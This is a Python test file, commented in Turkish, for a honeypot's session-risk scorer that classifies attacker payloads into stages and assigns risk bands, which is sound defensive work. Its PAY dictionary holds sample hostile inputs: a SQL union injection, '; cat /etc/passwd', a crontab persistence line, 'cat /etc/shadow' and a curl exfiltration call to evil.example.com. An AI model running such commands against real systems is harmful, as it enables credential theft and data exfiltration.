"""Faz 75 - Oturum Riski / Etkilesim Derinligi skorlayici testleri.

Deterministik, harici bagimlilik yok. Asama tespiti, birikimli skor, bant
esikleri, honeytoken/aldatma temasi, bos girdi (guvenli sifir), monitor
toplamasi ve gercek DB uzerinden analyze_recent kapsanir.
"""
from arachne.adaptive import session_risk as sr


# Her biri attack_stages siniflandiricisinda net bir asamaya oturan payload'lar.
PAY = {
    "recon": "GET /robots.txt HTTP/1.1",
    "scan": "GET /wp-admin/ HTTP/1.1",
    "ia": "id=1 union select username,pw from users",
    "exec": "; cat /etc/passwd",
    "persist": "crontab -l; echo pwned >> /etc/crontab",
    "cred": "cat /etc/shadow",
    "exfil": "curl http://evil.example.com/steal",
}


def _ev(payload=None, event_type=None, service=None, ts=1000.0):
    return {"payload": payload, "event_type": event_type,
            "service": service, "timestamp": ts}


# --------------------------------------------------------------------------
# engagement_score - bos girdi -> guvenli sifir
# --------------------------------------------------------------------------
def test_empty_input_safe_zero():
    r = sr.engagement_score([])
    assert r["score"] == 0
    assert r["band_tr"] == "DUSUK"
    assert r["reached_stages"] == []
    assert r["depth"] == 0
    assert r["top_signal"] is None

    r2 = sr.engagement_score(None)
    assert r2["score"] == 0
    assert r2["depth"] == 0


def test_unclassifiable_events_score_zero():
    r = sr.engagement_score([_ev("sadece dost bir merhaba"), _ev("")])
    assert r["score"] == 0
    assert r["depth"] == 0


# --------------------------------------------------------------------------
# Asama tespiti + birikimli, tirmanan skor
# --------------------------------------------------------------------------
def test_shallow_recon_only_low_band():
    r = sr.engagement_score([_ev(PAY["recon"])])
    assert r["depth"] == 1
    assert r["band_tr"] == "DUSUK"
    assert r["score"] > 0


def test_deep_engagement_escalates_to_critical():
    evs = [_ev(PAY["recon"]), _ev(PAY["scan"]), _ev(PAY["ia"]),
           _ev(PAY["exec"]), _ev(PAY["persist"])]
    r = sr.engagement_score(evs)
    assert r["depth"] == 5
    assert r["band_tr"] == "KRITIK"
    assert r["score"] >= 75
    # En derin sinyal en agir asama olmali (kalicilik, agirlik 30).
    assert r["top_signal"] is not None


def test_score_is_cumulative_and_monotone():
    shallow = sr.engagement_score([_ev(PAY["recon"])])["score"]
    deeper = sr.engagement_score([_ev(PAY["recon"]), _ev(PAY["ia"])])["score"]
    assert deeper > shallow


def test_score_capped_at_100():
    # Tum asamalar birden -> ham toplam 100'u asar, tavana oturur.
    evs = [_ev(p) for p in PAY.values()]
    r = sr.engagement_score(evs)
    assert r["score"] <= 100


# --------------------------------------------------------------------------
# Bant esikleri
# --------------------------------------------------------------------------
def test_band_thresholds():
    assert sr._band(0) == "DUSUK"
    assert sr._band(19) == "DUSUK"
    assert sr._band(20) == "ORTA"
    assert sr._band(44) == "ORTA"
    assert sr._band(45) == "YUKSEK"
    assert sr._band(74) == "YUKSEK"
    assert sr._band(75) == "KRITIK"
    assert sr._band(100) == "KRITIK"


def test_medium_band_single_exploit():
    r = sr.engagement_score([_ev(PAY["ia"])])
    assert r["band_tr"] == "ORTA"


def test_high_band_exploit_plus_persistence():
    r = sr.engagement_score([_ev(PAY["ia"]), _ev(PAY["persist"])])
    assert r["band_tr"] == "YUKSEK"
    assert r["depth"] == 2


# --------------------------------------------------------------------------
# Honeytoken / aldatma temasi (imza payload'i olmadan)
# --------------------------------------------------------------------------
def test_deception_contact_by_event_type():
    r = sr.engagement_score([_ev(event_type="HONEYTOKEN_TRIGGER")])
    assert r["depth"] == 1
    assert r["top_signal"] == sr._DECEPTION_TR
    assert r["score"] >= 20


def test_deception_contact_by_service():
    r = sr.engagement_score([_ev(service="honeytoken-db")])
    assert r["top_signal"] == sr._DECEPTION_TR


# --------------------------------------------------------------------------
# SessionRiskMonitor - toplama
# --------------------------------------------------------------------------
def test_monitor_aggregates_and_ranks():
    mon = sr.SessionRiskMonitor()
    # Derin saldirgan
    for key in ("recon", "scan", "ia", "persist"):
        mon.observe("7.7.7.7", payload=PAY[key])
    # Sig saldirgan
    mon.observe("1.1.1.1", payload=PAY["recon"])

    rep = mon.report()
    assert rep["count"] == 2
    assert rep["ranked"][0]["ip"] == "7.7.7.7"
    assert rep["top_ip"]["ip"] == "7.7.7.7"
    assert rep["high_count"] >= 1


def test_monitor_observe_ignores_none_ip():
    mon = sr.SessionRiskMonitor()
    mon.observe(None, payload=PAY["ia"])
    rep = mon.report()
    assert rep["count"] == 0


def test_monitor_empty_report():
    mon = sr.SessionRiskMonitor()
    rep = mon.report()
    assert rep["ranked"] == []
    assert rep["top_ip"] is None
    assert rep["high_count"] == 0
    assert rep["count"] == 0


# --------------------------------------------------------------------------
# analyze_recent - gercek DB (bos ve dolu)
# --------------------------------------------------------------------------
def test_analyze_recent_empty_db(tmp_path):
    from arachne import storage
    db = str(tmp_path / "empty.db")
    storage.init_db(db_path=db)
    res = sr.analyze_recent(db_path=db)
    assert res["count"] == 0
    assert res["ranked"] == []
    assert res["top_ip"] is None
    assert res["high_count"] == 0


def test_analyze_recent_detects_from_db(tmp_path):
    from arachne import storage
    db = str(tmp_path / "full.db")
    storage.init_db(db_path=db)
    # Derin saldirgan: recon+scan+exploit+kalicilik + honeytoken temasi
    storage.log_event("7.7.7.7", "http", "request", payload=PAY["recon"], db_path=db)
    storage.log_event("7.7.7.7", "http", "request", payload=PAY["scan"], db_path=db)
    storage.log_event("7.7.7.7", "http", "request", payload=PAY["ia"], db_path=db)
    storage.log_event("7.7.7.7", "http", "request", payload=PAY["persist"], db_path=db)
    storage.log_event("7.7.7.7", "honeytoken", "HONEYTOKEN_TRIGGER", db_path=db)
    # Sig saldirgan: sadece kesif
    storage.log_event("1.1.1.1", "http", "request", payload=PAY["recon"], db_path=db)

    res = sr.analyze_recent(db_path=db)
    assert res["count"] == 2
    assert res["top_ip"]["ip"] == "7.7.7.7"
    assert res["top_ip"]["band_tr"] == "KRITIK"
    assert res["ranked"][0]["ip"] == "7.7.7.7"
    assert res["high_count"] == 1


def test_analyze_recent_never_crashes_bad_path():
    res = sr.analyze_recent(db_path="/nonexistent/dir/does_not_exist.db")
    assert res["count"] == 0
    assert res["ranked"] == []
    assert res["top_ip"] is None
